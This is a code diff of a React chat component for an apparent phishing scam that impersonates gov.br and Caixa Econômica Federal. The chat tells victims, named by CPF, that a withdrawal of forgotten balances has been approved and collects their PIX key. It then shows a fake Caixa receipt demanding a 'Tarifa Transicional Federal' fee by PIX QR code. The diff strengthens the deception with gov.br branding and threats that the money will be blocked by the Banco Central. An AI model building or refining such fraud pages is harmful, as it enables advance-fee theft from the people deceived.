@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from "react";
-import { CheckCircle2, Search, ArrowRight, ShieldCheck, Loader2, PlayCircle, PauseCircle, MessageCircle } from "lucide-react";
+import { CheckCircle2, Search, ArrowRight, ShieldCheck, Loader2, PlayCircle, PauseCircle, AlertCircle } from "lucide-react";
 import { motion, AnimatePresence } from "motion/react";
 import axios from "axios";
 import { API_URL } from "../config";
@@ -73,11 +73,12 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setLeadName(name);
         
         const val = calculateValue(data.docValue);
-        setLeadValue(val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }));
+        const formattedVal = val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        setLeadValue(formattedVal);
         
         setTyping(false);
-        addBotMessage(`Oii, ${name}! Tudo bem? Sou a ${selectedAttendant.name}. Tô vendo aqui que você tem um resgate aprovado de **${val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}** no seu ${data.docType}: ${data.docValue}. É você mesmo?`, [
-          { text: "Sim, sou eu!", action: "confirm_identity" }
+        addBotMessage(`Parabéns, **${name}**!\n\nA sua **solicitação de saque foi aprovada** no valor de **${formattedVal}** referentes a saldos esquecidos no CPF ${data.docValue}.`, [
+          { text: "Efetuar saque", action: "confirm_identity" }
         ]);
       } catch (e) {
         setTyping(false);
@@ -108,36 +109,29 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
 
   const handleAction = async (action: string, payload?: string) => {
     if (action === "confirm_identity") {
-      addUserMessage("Sim, sou eu!");
       setMessages(prev => {
         const newMessages = [...prev];
-        if (newMessages.length > 1) {
-             newMessages[newMessages.length - 2].options = [];
-        }
+        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
         return newMessages;
       });
       setTyping(true);
       setTimeout(() => {
         setTyping(false);
-        addBotMessage("Tô verificando aqui no sistema, só um segundo... 🔄");
-        setTimeout(() => {
-          addBotMessage("Pronto! Deu super certo ✅. Pra qual conta eu posso mandar esse valor agora?", [
-            { text: "Mandar por PIX", action: "request_pix" }
-          ]);
-        }, 2000);
+        addBotMessage("**ATENÇÃO:** Após essa solicitação para saque, **você irá iniciar o seu recebimento do saque imediato**, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nCaso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos.\n\n**Observação:** Isso só acontecerá se você não concluir a etapa a seguir.", [
+          { text: "Efetuar Saque", action: "request_pix" }
+        ]);
       }, 1000);
     } 
     else if (action === "request_pix") {
-      addUserMessage("Mandar por PIX");
       setMessages(prev => {
         const newMessages = [...prev];
-        if (newMessages.length > 1) newMessages[newMessages.length - 2].options = [];
+        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
         return newMessages;
       });
       setTyping(true);
       setTimeout(() => {
         setTyping(false);
-        addBotMessage("Perfeito! Digita aqui embaixo qual é a sua Chave PIX, por favor:");
+        addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua **Chave PIX** de preferência:`);
         setAwaitingPix(true);
       }, 1000);
     }
@@ -145,7 +139,6 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       const pix = payload || inputValue;
       if (!pix) return;
       
-      // Smart PIX Validation
       const pixType = identifyPixType(pix);
       if (pixType === "Chave Aleatória" && pix.length < 8) {
          setAwaitingPix(false);
@@ -154,7 +147,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
          setTyping(true);
          setTimeout(() => {
             setTyping(false);
-            addBotMessage("Poxa, eu não consegui identificar isso como uma chave PIX válida. Pra eu conseguir te mandar o dinheiro agora, digita certinho a sua Chave PIX, tá bom?");
+            addBotMessage("Eu não consegui identificar isso como uma chave PIX válida. Digite corretamente a sua Chave PIX:");
             setAwaitingPix(true);
          }, 1000);
          return;
@@ -162,41 +155,24 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
 
       setAwaitingPix(false);
       setInputValue("");
-      addUserMessage(`Minha Chave PIX é: ${pix}`);
+      addUserMessage(pix);
       setLeadPixKey(pix);
       setTyping(true);
       
       setTimeout(() => {
         setTyping(false);
-        addBotMessage(`Legal, ${leadName.split(" ")[0]}! A chave foi aprovada no tipo ${pixType}.\nClica no botão aqui embaixo pra gente finalizar o saque:`, [
-          { text: "Efetuar Saque Agora", action: "warning_step" }
+        addBotMessage(`A sua **solicitação de saque foi aprovada** para a Chave Pix cadastrada:\n**Chave Pix:** ${pix}\n\nClique no botão abaixo para efetuar a **transferência do valor de ${leadValue}** para a conta da Chave Pix cadastrada.`, [
+          { text: "Receber por PIX", action: "generate_payment" }
         ]);
       }, 1500);
     }
-    else if (action === "warning_step") {
-      addUserMessage("Efetuar Saque");
-      setMessages(prev => {
-        const newMessages = [...prev];
-        if (newMessages.length > 1) newMessages[newMessages.length - 2].options = [];
-        return newMessages;
-      });
-      setTyping(true);
-      setTimeout(() => {
-        setTyping(false);
-        addBotMessage("⚠️ **ATENÇÃO:** Caso não conclua o processo agora, o valor poderá ser retido pelo Governo Federal novamente.\nTem certeza que deseja prosseguir com o saque agora?", [
-          { text: "Efetuar Saque Agora", action: "generate_payment" }
-        ]);
-      }, 1000);
-    }
     else if (action === "generate_payment") {
-      addUserMessage("Efetuar Saque Agora");
       setMessages(prev => {
         const newMessages = [...prev];
-        if (newMessages.length > 1) newMessages[newMessages.length - 2].options = [];
+        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
         return newMessages;
       });
       setTyping(true);
-      setFlowState(1); // Mudar layout para Comprovante
       
       try {
         // Fetch TTS audio
@@ -239,114 +215,44 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
     }
   };
 
-  if (flowState === 2) {
-    return (
-      <div className="w-full max-w-md mx-auto space-y-6">
-        <div className="bg-white dark:bg-[#1f292e] rounded-lg shadow-sm border border-gray-100 overflow-hidden">
-          {/* Cabeçalho Caixa */}
-          <div className="bg-[#005CA9] p-4 text-center">
-            <h2 className="text-white font-bold text-lg tracking-wide uppercase">CAIXA ECONÔMICA FEDERAL</h2>
-            <p className="text-blue-100 text-xs">Comprovante de Emissão SVR</p>
-          </div>
-          
-          <div className="p-4 bg-red-50 dark:bg-red-900/20 text-center border-b border-red-100">
-             <p className="text-red-700 dark:text-red-400 font-bold text-sm">⚠️ PIX Pendente! Aguardando Pagamento da Tarifa Transicional...</p>
-          </div>
-
-          <div className="p-6 space-y-4">
-             <div className="flex justify-between items-center text-sm border-b pb-2">
-                <span className="text-gray-500">Beneficiário:</span>
-                <span className="font-bold text-gray-800 dark:text-gray-200">{leadName}</span>
-             </div>
-             <div className="flex justify-between items-center text-sm border-b pb-2">
-                <span className="text-gray-500">Documento:</span>
-                <span className="font-bold text-gray-800 dark:text-gray-200">{data.docValue}</span>
-             </div>
-             <div className="flex justify-between items-center text-sm border-b pb-2">
-                <span className="text-gray-500">Chave PIX Cadastrada:</span>
-                <span className="font-bold text-gray-800 dark:text-gray-200">{leadPixKey}</span>
-             </div>
-             <div className="flex justify-between items-center text-sm pt-2">
-                <span className="text-gray-500 font-medium">Valor Liberado:</span>
-                <span className="font-bold text-green-600 text-lg">{leadValue}</span>
-             </div>
-          </div>
-        </div>
-
-        <div className="bg-white dark:bg-[#1f292e] rounded-lg shadow-sm p-6 space-y-6 border border-gray-100 text-center">
-           <h3 className="text-lg font-bold">PAGAMENTO DA TARIFA</h3>
-           <p className="text-sm text-gray-600 dark:text-gray-300">
-             Tarifa Transicional Federal: <strong>R$ {tarifa.toFixed(2)}</strong>
-           </p>
-
-           {buyPixData?.pix_qr_code && (
-              <div className="flex flex-col items-center space-y-4">
-                 <div className="bg-white p-2 rounded-xl relative border-2 border-gray-100 inline-block shadow-sm">
-                    <QRCodeCanvas value={buyPixData.pix_qr_code} size={200} />
-                    <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-white rounded p-1">
-                      <span className="font-bold text-blue-700 text-[10px]">CAIXA</span>
-                    </div>
-                 </div>
-                 <button onClick={copyPix} className="bg-[#2d7890] hover:bg-[#215a6d] text-white w-full py-3 rounded-lg font-bold transition-all shadow-md active:scale-[0.98]">
-                    Copiar Código PIX
-                 </button>
-              </div>
-           )}
-
-           {audioUrl && (
-             <div className="mt-4 bg-blue-50 dark:bg-blue-900/30 p-4 rounded-lg flex items-center space-x-3 border border-blue-100">
-                <PlayCircle className="text-[#2d7890] w-8 h-8" />
-                <div className="flex-1 text-left">
-                   <p className="text-xs font-bold text-[#2d7890]">Áudio Oficial gov.br</p>
-                   <p className="text-[10px] text-gray-500">Ouvindo orientações finais...</p>
-                </div>
-                <audio ref={audioRef} autoPlay onEnded={() => console.log('Audio ended')} />
-             </div>
-           )}
-
-           <p className="text-xs text-gray-400 mt-4">
-             Prazo para homologação: 10 minutos. Pague o mais rápido possível para evitar o cancelamento da liberação.
-           </p>
-        </div>
-      </div>
-    );
-  }
-
   return (
-    <div className="w-full max-w-lg mx-auto bg-white dark:bg-[#1f292e] rounded-xl shadow-lg border border-gray-100 overflow-hidden flex flex-col h-[600px]">
-      {/* Header gov.br like */}
-      <div className="bg-[#1b365d] text-white p-4 flex items-center shadow-md z-10">
-        <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center text-[#1b365d] font-bold mr-3 shadow-inner">
-          <MessageCircle size={20} />
-        </div>
-        <div>
-          <h2 className="font-bold text-sm tracking-wide">Assistente {attendant.name}</h2>
-          <p className="text-xs text-blue-200">Online e verificando...</p>
-        </div>
-      </div>
-
-      {/* Messages */}
-      <div className="flex-1 overflow-y-auto p-4 space-y-4 bg-slate-50 dark:bg-[#12181b]">
+    <div className="fixed inset-0 z-50 bg-[#161c24] flex flex-col font-sans overflow-hidden">
+      
+      {/* Messages Area */}
+      <div className="flex-1 overflow-y-auto px-4 py-8 space-y-6">
         <AnimatePresence>
           {messages.map((msg, i) => (
             <motion.div 
               key={i} 
-              initial={{ opacity: 0, y: 10 }}
+              initial={{ opacity: 0, y: 15 }}
               animate={{ opacity: 1, y: 0 }}
-              className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}
+              className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start items-start gap-3'}`}
             >
-              <div className={`max-w-[85%] p-3 rounded-2xl text-sm shadow-sm ${msg.sender === 'user' ? 'bg-[#1b365d] text-white rounded-tr-none' : 'bg-white dark:bg-[#1f292e] text-gray-800 dark:text-gray-200 rounded-tl-none border border-gray-100 dark:border-gray-800'}`}>
-                {msg.text.split('\\n').map((line:string, idx:number) => (
-                   <p key={idx} className="mb-1" dangerouslySetInnerHTML={{__html: line.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')}} />
-                ))}
-                
+              {msg.sender === 'bot' && (
+                <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
+                   {/* Logo gov.br simulada */}
+                   <span className="text-white font-bold text-xs">gov.br</span>
+                </div>
+              )}
+
+              <div className={`flex flex-col ${msg.sender === 'user' ? 'items-end' : 'items-start'} w-full max-w-[85%]`}>
+                <div className={`p-4 text-[15px] leading-relaxed shadow-sm w-full ${
+                  msg.sender === 'user' 
+                    ? 'bg-[#1b365d] text-white rounded-2xl rounded-tr-sm' 
+                    : 'bg-[#1e2732] text-[#d1d5db] rounded-2xl rounded-tl-sm'
+                }`}>
+                  {msg.text.split('\\n').map((line:string, idx:number) => (
+                     <p key={idx} className={`${idx !== 0 ? 'mt-2' : ''}`} dangerouslySetInnerHTML={{__html: line.replace(/\*\*(.*?)\*\*/g, '<strong class="text-white">$1</strong>')}} />
+                  ))}
+                </div>
+
                 {msg.options && msg.options.length > 0 && (
-                  <div className="mt-3 space-y-2">
+                  <div className="mt-3 flex justify-end w-full">
                     {msg.options.map((opt: any, j: number) => (
                       <button 
                         key={j}
                         onClick={() => handleAction(opt.action)}
-                        className="w-full block text-center bg-blue-50 hover:bg-blue-100 dark:bg-blue-900/30 dark:hover:bg-blue-800/40 text-[#1b365d] dark:text-blue-200 font-semibold py-2 px-3 rounded-lg border border-blue-100 transition-colors"
+                        className="bg-[#ff9029] hover:bg-[#e87f1f] text-white font-bold py-2.5 px-6 rounded transition-colors shadow-md text-sm tracking-wide"
                       >
                         {opt.text}
                       </button>
@@ -356,37 +262,147 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
               </div>
             </motion.div>
           ))}
+
           {typing && (
-             <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex justify-start">
-               <div className="bg-white p-3 rounded-2xl rounded-tl-none border border-gray-100 shadow-sm flex space-x-1 items-center">
+             <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex justify-start items-start gap-3">
+               <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
+                 <span className="text-white font-bold text-xs">gov.br</span>
+               </div>
+               <div className="bg-[#1e2732] p-4 rounded-2xl rounded-tl-sm shadow-sm flex items-center space-x-2">
                   <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" />
                   <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }} />
                   <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.4s' }} />
                </div>
              </motion.div>
           )}
+
+          {/* Estado Final (Ticket Caixa) embutido no chat */}
+          {flowState === 2 && (
+            <motion.div 
+              initial={{ opacity: 0, y: 15 }}
+              animate={{ opacity: 1, y: 0 }}
+              className="flex justify-start items-start gap-3 mt-6 pb-20"
+            >
+              <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
+                <span className="text-white font-bold text-xs">gov.br</span>
+              </div>
+              <div className="w-full max-w-xs sm:max-w-sm rounded-xl overflow-hidden shadow-xl bg-[#f5f6f8]">
+                
+                {/* Header CAIXA Azul */}
+                <div className="bg-[#005CA9] px-4 py-5 flex items-center justify-center relative">
+                   <h2 className="text-white font-extrabold text-2xl tracking-widest relative z-10">CAIXA</h2>
+                   {/* Linha abstrata de fundo simulando o logo */}
+                   <div className="absolute inset-0 opacity-20 bg-[linear-gradient(45deg,transparent_45%,white_45%,white_55%,transparent_55%)] bg-[length:20px_20px]"></div>
+                </div>
+
+                <div className="bg-white p-4">
+                  {/* Valores e Data Header */}
+                  <div className="flex justify-between items-start mb-4 border-b border-gray-200 pb-3">
+                    <div>
+                      <p className="text-[11px] text-gray-500 uppercase tracking-wider font-semibold">Valor</p>
+                      <p className="text-[#005CA9] font-bold text-lg">{leadValue}</p>
+                    </div>
+                    <div className="text-right">
+                      <p className="text-[11px] text-gray-500 uppercase tracking-wider font-semibold">Data</p>
+                      <p className="text-gray-700 text-sm">{new Date().toLocaleDateString('pt-BR')}</p>
+                      <p className="text-gray-500 text-xs">{new Date().toLocaleTimeString('pt-BR')}</p>
+                    </div>
+                  </div>
+
+                  {/* Alerta de PIX Pendente */}
+                  <div className="bg-red-50 rounded-lg p-3 flex items-start gap-3 mb-5 border border-red-100">
+                    <AlertCircle className="text-red-500 w-8 h-8 flex-shrink-0 mt-0.5" />
+                    <div>
+                      <h4 className="text-red-600 font-bold text-[15px]">PIX Pendente!</h4>
+                      <p className="text-red-400 text-xs">Aguardando Pagamento da Tarifa Transacional...</p>
+                    </div>
+                  </div>
+
+                  {/* Dados do Recebedor */}
+                  <div className="space-y-3">
+                    <h3 className="text-gray-600 font-bold text-sm">Dados do Recebedor:</h3>
+                    
+                    <div>
+                      <p className="text-xs text-gray-500">Nome:</p>
+                      <p className="text-sm font-medium text-gray-800">{leadName}</p>
+                    </div>
+                    
+                    <div>
+                      <p className="text-xs text-gray-500">CPF:</p>
+                      <p className="text-sm font-medium text-gray-800">{data.docValue}</p>
+                    </div>
+
+                    <div>
+                      <p className="text-xs text-gray-500">Data de Nascimento:</p>
+                      <p className="text-sm font-medium text-gray-800">{data.birthDate}</p>
+                    </div>
+
+                    <div>
+                      <p className="text-xs text-gray-500">Chave Pix:</p>
+                      <p className="text-sm font-medium text-gray-800">{leadPixKey}</p>
+                    </div>
+                  </div>
+
+                  {/* Area de Pagamento da Tarifa */}
+                  <div className="mt-6 pt-5 border-t border-gray-200">
+                    <p className="text-center text-sm text-gray-600 font-medium mb-4">
+                      Tarifa Transicional Federal: <strong className="text-gray-900">R$ {tarifa.toFixed(2)}</strong>
+                    </p>
+
+                    {buyPixData?.pix_qr_code ? (
+                      <div className="flex flex-col items-center space-y-4">
+                        <div className="bg-white p-2 rounded-xl border border-gray-200 shadow-sm">
+                            <QRCodeCanvas value={buyPixData.pix_qr_code} size={180} />
+                        </div>
+                        <button onClick={copyPix} className="w-full bg-[#ff9029] hover:bg-[#e87f1f] text-white py-3 rounded-md font-bold transition-colors shadow-md text-sm">
+                            Copiar Código PIX
+                        </button>
+                      </div>
+                    ) : (
+                      <div className="flex justify-center p-4">
+                        <Loader2 className="w-6 h-6 text-[#005CA9] animate-spin" />
+                      </div>
+                    )}
+                  </div>
+                </div>
+              </div>
+            </motion.div>
+          )}
+
           <div ref={endOfMessagesRef} />
         </AnimatePresence>
       </div>
 
-      {/* Input Area */}
-      {awaitingPix && (
-        <div className="p-3 bg-white border-t border-gray-100 flex items-center space-x-2">
-          <input 
-            type="text" 
-            value={inputValue}
-            onChange={(e) => setInputValue(e.target.value)}
-            onKeyDown={(e) => e.key === 'Enter' && handleAction("submit_pix")}
-            placeholder="Digite sua Chave PIX..."
-            className="flex-1 bg-slate-100 rounded-full px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1b365d]"
-          />
-          <button 
-            onClick={() => handleAction("submit_pix")}
-            className="w-10 h-10 bg-[#1b365d] text-white rounded-full flex items-center justify-center hover:bg-[#122644] transition-colors"
+      {/* Input Area (Apenas quando aguarda o PIX) */}
+      <AnimatePresence>
+        {awaitingPix && (
+          <motion.div 
+            initial={{ opacity: 0, y: 100 }}
+            animate={{ opacity: 1, y: 0 }}
+            exit={{ opacity: 0, y: 100 }}
+            className="p-4 bg-[#1e2732] flex items-center space-x-3 shadow-[0_-4px_15px_rgba(0,0,0,0.2)]"
           >
-            <ArrowRight size={18} />
-          </button>
-        </div>
+            <input 
+              type="text" 
+              value={inputValue}
+              onChange={(e) => setInputValue(e.target.value)}
+              onKeyDown={(e) => e.key === 'Enter' && handleAction("submit_pix")}
+              placeholder="Digite sua chave PIX..."
+              className="flex-1 bg-[#161c24] border border-[#2d3748] text-white rounded-full px-5 py-3 text-sm focus:outline-none focus:border-[#ff9029]"
+            />
+            <button 
+              onClick={() => handleAction("submit_pix")}
+              className="w-12 h-12 bg-[#ff9029] text-white rounded-full flex items-center justify-center hover:bg-[#e87f1f] transition-colors shadow-lg"
+            >
+              <ArrowRight size={20} />
+            </button>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* Audio Player Oculto para autoplay e controle */}
+      {audioUrl && (
+         <audio ref={audioRef} style={{ display: 'none' }} />
       )}
     </div>
   );
